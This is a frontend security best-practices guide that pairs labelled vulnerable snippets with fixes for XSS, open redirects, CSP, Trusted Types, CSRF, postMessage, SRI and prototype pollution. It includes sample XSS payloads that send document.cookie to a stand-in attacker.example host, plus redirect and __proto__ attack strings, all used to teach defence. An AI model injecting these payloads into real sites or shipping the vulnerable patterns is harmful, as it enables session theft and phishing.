# Frontend Security Best Practices

Patterns that survive the next developer. Each names its Top 10 2025 category, ASVS 5.0 chapter,
and CWE. Every vulnerable block is labelled and paired with a fix.

## Render Text as Text

`A05:2025` · ASVS V1 (Encoding and Sanitization) · CWE-79

The default should never be HTML construction. If the value is a name, a comment, or a title, it
is text.

```javascript
// Vulnerable: any HTML in the value executes
function renderName(el, user) {
  el.innerHTML = `<span class="name">${user.displayName}</span>`;
}
```

A `displayName` of `<img src=x onerror=fetch('https://attacker.example/'+document.cookie)>`
runs on every page that renders the profile. Stored XSS, no interaction needed.

```javascript
// Fixed: the browser never parses the value as markup
function renderName(el, user) {
  const span = document.createElement("span");
  span.className = "name";
  span.textContent = user.displayName;
  el.replaceChildren(span);
}
```

Why this works: `textContent` assigns a string to a text node. There is no HTML parser in the
path, so there is nothing to escape and nothing to get wrong. Escaping the value with a hand-written
`replace()` chain is the tempting alternative and it is weaker — it has to be correct for HTML
body, attribute, and URL contexts at once, and it usually misses backtick, single quote, or
`</script`.

In frameworks, interpolation already does this. `{user.displayName}` in React and
`{{ user.displayName }}` in Vue are safe. The bugs are in the escape hatches, not the defaults.

## Sanitize Only When HTML Must Stay HTML

`A05:2025` · ASVS V1 · CWE-79

Rich text from a user is the one legitimate case. Use a maintained sanitizer with an explicit
allowlist, pinned to an exact version.

```javascript
// Vulnerable: server-provided HTML trusted because "our API returns it"
<div dangerouslySetInnerHTML={{ __html: article.bodyHtml }} />
```

The API returns what some other user typed. Trusting your own API is trusting every writer to it.

```typescript
// Fixed: explicit allowlist, sanitized at the render boundary
import DOMPurify from "dompurify";

const ARTICLE_CONFIG = {
  ALLOWED_TAGS: ["p", "br", "strong", "em", "ul", "ol", "li", "a", "code", "pre", "blockquote"],
  ALLOWED_ATTR: ["href", "title"],
  ALLOWED_URI_REGEXP: /^(?:https?|mailto):/i,
  FORBID_TAGS: ["style", "svg", "math", "form"],
  RETURN_TRUSTED_TYPE: false,
} as const;

export function ArticleBody({ bodyHtml }: { bodyHtml: string }) {
  const clean = DOMPurify.sanitize(bodyHtml, ARTICLE_CONFIG);
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

Why this works: the allowlist enumerates what is permitted, so a tag or attribute nobody thought
of is dropped rather than passed. `ALLOWED_URI_REGEXP` closes `javascript:` in `href`, which the
tag allowlist alone does not.

Three rules that come with it:

- Sanitize once, at the point of rendering. Sanitizing on save leaves the stored value trusted by
  every other consumer, including an export or a mobile client with a different renderer.
- Never sanitize then modify. Appending to sanitized HTML re-opens the parser.
- `SAFE_FOR_TEMPLATES` and `ALLOW_UNKNOWN_PROTOCOLS` widen the surface. Do not enable either
  without a specific reason written next to it.

Honest gap: DOMPurify sanitizes for an HTML body context. Output placed inside an attribute, a
`<style>` block, or an SVG `<use href>` is not covered by the same config. mXSS through mutating
parsers has produced real bypasses; pinning the version and updating deliberately is part of the
control, not optional hygiene.

## Check the Scheme Before Any URL Sink

`A01:2025`, `A05:2025` · ASVS V2 (Validation and Business Logic) · CWE-79, CWE-601

```javascript
// Vulnerable: the scheme comes from the attacker
<a href={profile.website}>Website</a>
```

`profile.website` of `javascript:fetch('https://attacker.example/?c='+document.cookie)` gives XSS
on click. React blocks this in recent versions with a warning for `javascript:` specifically, but
`data:text/html` and framework-version drift make relying on that unwise.

```typescript
// Fixed: parse, then allowlist the scheme
const SAFE_SCHEMES = new Set(["http:", "https:", "mailto:"]);

export function safeExternalUrl(raw: string | null | undefined): string | null {
  if (!raw) return null;
  let url: URL;
  try {
    url = new URL(raw, window.location.origin);
  } catch {
    return null;
  }
  return SAFE_SCHEMES.has(url.protocol) ? url.toString() : null;
}
```

Why this works: `new URL()` normalizes before the check, so `JaVaScRiPt:`, leading whitespace,
embedded newlines, and `%6a%61%76%61...` all resolve to the same protocol string the allowlist
tests. A `startsWith("javascript:")` check misses every one of those.

The same function guards `src`, `action`, `formaction`, `window.open`, and `location.assign`.

## Redirects Resolve to Known Targets

`A01:2025` · ASVS V2 · CWE-601

```javascript
// Vulnerable: open redirect, used for credential phishing
const next = new URLSearchParams(location.search).get("next");
location.assign(next);
```

`?next=https://accounts.example.attacker-site.test/login` sends a user who clicked your domain to
a copy of your login page, with your domain in the referrer and in their memory of where they
clicked.

```typescript
// Fixed: map to known routes, and fall back to a default
const RETURN_ROUTES: Record<string, string> = {
  dashboard: "/dashboard",
  billing: "/settings/billing",
  orders: "/orders",
};

const key = new URLSearchParams(location.search).get("next") ?? "";
location.assign(RETURN_ROUTES[key] ?? "/dashboard");
```

Where a full path must be accepted, require same-origin after parsing:

```typescript
function safeReturnPath(raw: string): string {
  const url = new URL(raw, window.location.origin);
  if (url.origin !== window.location.origin) return "/dashboard";
  return url.pathname + url.search + url.hash;
}
```

Why this works: the decision is made from a server-controlled set, not from a string the attacker
supplied. Prefix checks are the tempting wrong fix — `startsWith("https://app.example.com")`
accepts `https://app.example.com.attacker-site.test`, and `startsWith("/")` accepts `//attacker`,
which browsers read as protocol-relative and treat as cross-origin.

## Nonce-Based CSP, Not an Allowlist

`A02:2025` · ASVS V3 (Web Frontend Security), V13 (Configuration) · CWE-79

```nginx
# Vulnerable: unsafe-inline makes the policy decorative
add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline' https://cdn.example.com";
```

`unsafe-inline` permits exactly the injected `<script>` the policy was added to stop. A host
allowlist fails differently: a single JSONP endpoint or an outdated Angular copy on
`cdn.example.com` turns the allowed origin into a script gadget.

```nginx
# Fixed: per-request nonce, strict-dynamic, no host allowlist to bypass
set $csp_nonce $request_id;

add_header Content-Security-Policy "default-src 'self'; script-src 'nonce-$csp_nonce' 'strict-dynamic' https: 'unsafe-inline'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'; require-trusted-types-for 'script'" always;
```

```javascript
// Express equivalent, with a real CSPRNG nonce
import crypto from "node:crypto";

app.use((req, res, next) => {
  res.locals.cspNonce = crypto.randomBytes(16).toString("base64");
  res.setHeader(
    "Content-Security-Policy",
    [
      "default-src 'self'",
      `script-src 'nonce-${res.locals.cspNonce}' 'strict-dynamic' https: 'unsafe-inline'`,
      "style-src 'self'",
      "img-src 'self' data:",
      "connect-src 'self' https://api.example.com",
      "object-src 'none'",
      "base-uri 'none'",
      "frame-ancestors 'none'",
      "require-trusted-types-for 'script'",
    ].join("; "),
  );
  next();
});
```

Why this works: the nonce is unguessable and regenerated per response, so an injected script tag
cannot carry a valid one. `strict-dynamic` lets a nonced script load its own dependencies without
you maintaining a host list. The trailing `https: 'unsafe-inline'` is a deliberate fallback — CSP
Level 3 browsers ignore both once a nonce is present, and older browsers get something rather than
nothing.

`nginx`'s `$request_id` is a 32-hex-character value derived from a random source and is acceptable
as a nonce. Do not substitute `$msec`, `$connection`, or a timestamp — a predictable nonce is no
nonce.

Details, including `report-only` rollout and the `frame-ancestors` versus `X-Frame-Options` split,
are in [references/csp-guide.md](references/csp-guide.md).

## Trusted Types to Close the Remaining Sinks

`A05:2025` · ASVS V3 · CWE-79

CSP stops injected scripts from executing. It does not stop `element.innerHTML = untrusted`.
`require-trusted-types-for 'script'` does, by making every DOM XSS sink throw unless the value came
from a named policy.

```javascript
// Fixed: one small, reviewed policy is the only way to produce HTML
import DOMPurify from "dompurify";

const policy = window.trustedTypes?.createPolicy("app-html", {
  createHTML: (input) => DOMPurify.sanitize(input, { RETURN_TRUSTED_TYPE: false }),
  createScriptURL: (input) => {
    const url = new URL(input, window.location.origin);
    if (url.origin !== window.location.origin) throw new TypeError("blocked script URL");
    return url.toString();
  },
  // no createScript: nothing in this app needs to build script text
});

element.innerHTML = policy ? policy.createHTML(userHtml) : "";
```

Why this works: the check moves from "did every developer remember" to "the browser refuses".
Assignment of a raw string to `innerHTML` becomes a `TypeError`, which surfaces in tests and in
CSP reports rather than in a bug bounty.

Two honest limits. Support is Chromium-first, so treat it as a hardening layer and keep the sinks
safe on their own. And a policy that returns its input unchanged is a rubber stamp — the policy body
is now the thing to review, so keep it to one file and one owner.

## Tokens Out of JavaScript's Reach

`A02:2025`, `A07:2025` · ASVS V3, V7 (Session Management) · CWE-1004, CWE-1275

```javascript
// Vulnerable: any XSS, anywhere on the origin, exfiltrates the session
localStorage.setItem("access_token", token);
fetch("/api/orders", { headers: { Authorization: `Bearer ${localStorage.getItem("access_token")}` } });
```

`localStorage` is readable by every script on the origin, including a compromised dependency and
an injected payload. There is no flag that changes this.

```javascript
// Fixed: server sets the cookie, JavaScript never sees it
res.cookie("session", sessionId, {
  httpOnly: true,
  secure: true,
  sameSite: "lax",
  path: "/",
  maxAge: 8 * 60 * 60 * 1000,
  // no Domain: host-only, so subdomains cannot read it
});
```

```javascript
// The client sends nothing explicitly; the browser attaches the cookie
await fetch("/api/orders", { credentials: "same-origin" });
```

Why this works: `HttpOnly` removes the token from the DOM API surface entirely, so XSS can still
act as the user but cannot steal a credential that outlives the page. That is a real reduction in
blast radius, not a fix for XSS.

The tradeoff is honest and worth stating: cookies are attached automatically, so the design now
needs CSRF protection. `SameSite=Lax` covers cross-site POST from a third-party page but not a
same-site subdomain you do not control, and not `GET` requests that change state.

## CSRF on Cookie-Authenticated State Changes

`A02:2025` · ASVS V3 · CWE-352

```javascript
// Vulnerable: cookie auth, no token. Any page can POST this on the user's behalf
app.post("/api/account/email", requireSession, async (req, res) => {
  await users.updateEmail(req.session.userId, req.body.email);
  res.sendStatus(204);
});
```

```javascript
// Fixed: double-submit with a signed cookie plus a header the attacker cannot set
import crypto from "node:crypto";

function issueCsrfToken(res, sessionId) {
  const raw = crypto.randomBytes(32).toString("base64url");
  const mac = crypto.createHmac("sha256", process.env.CSRF_SECRET).update(`${sessionId}.${raw}`).digest("base64url");
  const token = `${raw}.${mac}`;
  res.cookie("csrf", token, { secure: true, sameSite: "strict", httpOnly: false, path: "/" });
  return token;
}

function requireCsrf(req, res, next) {
  const fromHeader = req.get("X-CSRF-Token") ?? "";
  const fromCookie = req.cookies.csrf ?? "";
  const [raw, mac] = fromCookie.split(".");
  const expected = crypto
    .createHmac("sha256", process.env.CSRF_SECRET)
    .update(`${req.session.id}.${raw}`)
    .digest("base64url");

  const macOk = mac !== undefined && crypto.timingSafeEqual(Buffer.from(mac), Buffer.from(expected));
  const pairOk =
    fromHeader.length === fromCookie.length &&
    crypto.timingSafeEqual(Buffer.from(fromHeader), Buffer.from(fromCookie));

  if (!macOk || !pairOk) return res.status(403).json({ error: "csrf_failed" });
  next();
}
```

```javascript
// Client reads the non-HttpOnly CSRF cookie and echoes it in a header
await fetch("/api/account/email", {
  method: "POST",
  credentials: "same-origin",
  headers: { "Content-Type": "application/json", "X-CSRF-Token": readCookie("csrf") },
  body: JSON.stringify({ email }),
});
```

Why this works: a cross-site page can cause the browser to send the cookie but cannot read it and
cannot set a custom header on a cross-origin request without a preflight the server will reject.
The HMAC binds the token to the session, so a token planted by a subdomain the attacker controls
fails verification — plain double-submit without the MAC is the common weak version.

Synchronizer tokens stored server-side are stronger where you have session storage. Also check
`Origin`/`Sec-Fetch-Site` server-side as a second signal; do not rely on `Referer`, which is
frequently stripped.

## postMessage Has Two Origin Checks

`A05:2025` · ASVS V3 · CWE-346

```javascript
// Vulnerable: broadcast to any origin, accept from any origin
parent.postMessage({ token: sessionToken }, "*");

window.addEventListener("message", (e) => {
  document.querySelector("#panel").innerHTML = e.data.html;
});
```

Two separate bugs. `"*"` delivers the token to whatever page framed you. The listener trusts any
sender and feeds the payload straight into an HTML sink.

```javascript
// Fixed: exact target on send, origin and schema check on receive
const PARTNER_ORIGIN = "https://partner.example.com";

parent.postMessage({ type: "resize", height: document.body.scrollHeight }, PARTNER_ORIGIN);

window.addEventListener("message", (event) => {
  if (event.origin !== PARTNER_ORIGIN) return;
  if (event.source !== expectedFrame.contentWindow) return;

  const msg = event.data;
  if (typeof msg !== "object" || msg === null || msg.type !== "setLabel") return;
  if (typeof msg.text !== "string" || msg.text.length > 200) return;

  document.querySelector("#panel").textContent = msg.text;
});
```

Why this works: the origin is compared as an exact string, so `https://partner.example.com.attacker-site.test`
fails where `event.origin.includes("partner.example.com")` would pass. Checking `event.source` as
well stops a different window on the allowed origin from injecting. And the payload is treated as
untrusted data after the origin check, because a legitimate origin can still be XSSed.

Never send a credential over `postMessage`, even to a known origin. The channel is fine; the
practice of duplicating a secret into another document is not.

## Framing, Sniffing, Referrer

`A02:2025` · ASVS V3, V13 · CWE-1021

```nginx
# Fixed: the small set that pays for itself
add_header Content-Security-Policy "frame-ancestors 'none'" always;   # or explicit origins
add_header X-Frame-Options "DENY" always;                              # legacy fallback
add_header X-Content-Type-Options "nosniff" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
add_header Permissions-Policy "camera=(), microphone=(), geolocation=(), payment=()" always;
```

Why each is there: `frame-ancestors` stops the transparent-overlay click-hijack; `nosniff` stops a
user-uploaded file with a text `Content-Type` being executed as script; `Referrer-Policy` stops a
path containing a reset token from leaking to a third-party analytics request. Details and the
things each header does not do are in
[references/security-headers.md](references/security-headers.md).

HSTS is the one with a real footgun. `includeSubDomains` plus `preload` on a domain with a legacy
HTTP-only subdomain takes that subdomain offline for anyone who has visited you, and the change is
sticky for `max-age`. Roll it out with a short `max-age` first.

## Third-Party Scripts Get Integrity, Not Trust

`A03:2025` · ASVS V3, V15 · CWE-353

```html
<!-- Vulnerable: whatever that URL serves tomorrow runs in your origin -->
<script src="https://cdn.example.com/widget/latest.js"></script>
```

```html
<!-- Fixed: immutable version, integrity hash, explicit CORS mode -->
<script
  src="https://cdn.example.com/widget/4.2.1/widget.min.js"
  integrity="sha384-PLACEHOLDER_BASE64_HASH_REPLACE_WITH_REAL_VALUE"
  crossorigin="anonymous"
  nonce="{{cspNonce}}"
  defer
></script>
```

Why this works: the browser hashes the fetched bytes and refuses to execute on a mismatch, so a
compromised CDN or a hijacked DNS answer fails closed instead of running. `latest` cannot be
protected this way — a mutable URL and SRI are incompatible by design, which is the point.

SRI does not help a script that legitimately updates, and it does not constrain what an
intentionally malicious-but-unchanged script does. For anything that must self-update, the answers
are a sandboxed iframe with a narrow `postMessage` contract, or vendoring the file and reviewing
each bump.

## Prototype Pollution in Client State

`A05:2025` · ASVS V2, V15 · CWE-1321

```javascript
// Vulnerable: attacker-controlled keys walked into an object
function setPath(obj, path, value) {
  const parts = path.split(".");
  let cur = obj;
  for (const p of parts.slice(0, -1)) {
    cur[p] = cur[p] ?? {};
    cur = cur[p];
  }
  cur[parts.at(-1)] = value;
}

setPath(config, new URLSearchParams(location.search).get("k"), "1");
```

`?k=__proto__.isAdmin` sets a property every object in the page inherits. Client-side that flips
feature flags and template branches; the same helper on a Node server escalates to logic bypass or
worse.

```javascript
// Fixed: reject the dangerous keys, and use a prototype-less container
const BLOCKED = new Set(["__proto__", "constructor", "prototype"]);

function setPath(obj, path, value) {
  const parts = String(path).split(".");
  if (parts.some((p) => BLOCKED.has(p))) throw new TypeError("unsafe path");

  let cur = obj;
  for (const p of parts.slice(0, -1)) {
    if (!Object.hasOwn(cur, p)) cur[p] = Object.create(null);
    cur = cur[p];
  }
  cur[parts.at(-1)] = value;
}

const config = Object.create(null);
```

Why this works: two independent layers. The key check blocks the known escalation names, and
`Object.create(null)` means there is no prototype chain to poison even if a name is missed. A `Map`
is the better shape where the keys are genuinely dynamic — string keys on a `Map` cannot reach a
prototype at all. `Object.freeze(Object.prototype)` is a blunt global mitigation that breaks some
libraries; measure before reaching for it.

## Framework Escape Hatches

`A05:2025` · ASVS V1, V3 · CWE-79

Each framework escapes by default and gives you exactly one way out. The way out is the audit
target.

| Framework | Escape hatch | Rule |
|---|---|---|
| React | `dangerouslySetInnerHTML` | Sanitized value only. The prop name is the warning |
| Vue | `v-html` | Never on user data. Prefer a component tree |
| Angular | `bypassSecurityTrustHtml`, `bypassSecurityTrustScript` | Sanitize before bypassing; `DomSanitizer.sanitize()` is the safe call |
| Svelte | `{@html}` | Same rule as `v-html` |
| Any | `ref` + direct DOM writes | Reviewed like plain JavaScript, because it is |

```vue
<!-- Vulnerable -->
<template>
  <div v-html="comment.body"></div>
</template>
```

```vue
<!-- Fixed: text by default; sanitize only where markup is a product requirement -->
<script setup lang="ts">
import DOMPurify from "dompurify";
const props = defineProps<{ comment: { body: string } }>();
const safeBody = computed(() =>
  DOMPurify.sanitize(props.comment.body, {
    ALLOWED_TAGS: ["p", "br", "strong", "em", "a", "code"],
    ALLOWED_ATTR: ["href"],
    ALLOWED_URI_REGEXP: /^(?:https?|mailto):/i,
  }),
);
</script>

<template>
  <div v-html="safeBody"></div>
</template>
```

Why this works: the sanitizer runs on every render path, including the one added next sprint,
because it lives in the component rather than in a caller's discipline.

Two framework-specific traps worth knowing. React's JSX spread — `<div {...props} />` — will set
`dangerouslySetInnerHTML` if the object contains it, so spreading a server-supplied object is a
sink. And a dynamic component name (`<component :is="name">`, `React.createElement(name)`) sourced
from user input lets an attacker pick which component renders.

## Sources

- <https://owasp.org/Top10/2025/>
- <https://owasp.org/www-project-application-security-verification-standard/>
- <https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html>
- <https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html>
- <https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html>
- <https://www.w3.org/TR/CSP3/>
- <https://w3c.github.io/trusted-types/dist/spec/>
